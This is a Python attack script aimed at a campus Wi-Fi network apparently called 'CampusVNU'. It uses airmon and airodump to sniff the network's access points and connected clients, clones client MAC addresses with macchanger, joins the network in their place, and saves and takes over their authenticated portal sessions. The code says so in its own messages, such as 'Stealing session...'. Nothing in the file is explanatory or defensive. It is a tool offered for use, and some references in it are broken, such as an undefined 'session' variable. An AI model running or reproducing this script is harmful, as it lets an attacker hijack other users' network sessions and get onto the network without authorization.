import os
import time

from tools.airmon import Airmon
from tools.airodump import Airodump
from tools.macchaner import Macchanger
from tools.networkmanager import NetworkManager

from network.campusvnu import CampusVNU
from session.backup import store_data


if os.geteuid():
    print('[x] Run script as root!')
    exit(0)


interface = 'wlp5s0'
interface = Airmon.start(interface)
network = CampusVNU()

with Airodump(interface, essid_regex=network.name) as airodump:
    try:
        while True:
            os.system('clear')

            print('BSSID\t\t\tPrivacy\t\tPWR\tBeacons\t\tESSID')
            targets = airodump.get_targets()
            for t in targets:
                print(f'{t.bssid}\t{t.privacy}\t\t{t.power}\t{t.beacons}\t\t{t.essid}')

            print('\n\nBSSID\t\t\tSTATION\t\t\tPWR\tPackets\t\tProbed ESSIDs')

            all_clients = airodump.get_clients()
            clients = []

            for c in all_clients:
                for t in targets:
                    if t.bssid == c.bssid:
                        clients.append(c)

            clients.sort(key=lambda c: c.packets, reverse=True)

            for c in clients:
                for t in targets:
                    if t.bssid == c.bssid:
                        print(f'{c.bssid}\t{c.station}\t{c.power}\t{c.packets}\t\t{c.probed_essids}')
                    
            time.sleep(1)
    except KeyboardInterrupt:
        interface = Airmon.stop(interface)

macchanger = Macchanger(interface)

for c in clients:
    print('[*] Spoofing Clients...')
    print(f'[+] BSSID: {c.bssid} Client: {c.station}')

    print('[+] Changing MAC...')    
    macchanger.change(c.station)

    print('[+] Sleeping 5s...')
    time.sleep(5)

    print('[+] Connecting to Wi-Fi... ')
    for t in targets:
        if t.bssid == c.bssid:
            NetworkManager.connect2wifi(t.essid)
            break


    print('[+] Gathering info...')
    if network.get_info():
        network.print_info()

        print('[*] Saving session...')
        store_data(c, session)
    else:
        print(f'[x] No info!\n')
        continue       

    print('[*] Stealing session...')
    print('[+] Logging out...')
    network.logout()

    print('[+] Reseting MAC...')    
    macchanger.reset()

    print('[+] Connecting to Wi-Fi... ')
    NetworkManager.connect2wifi(c.bssid)

    network.login()

    print('[*] Done!')
    break
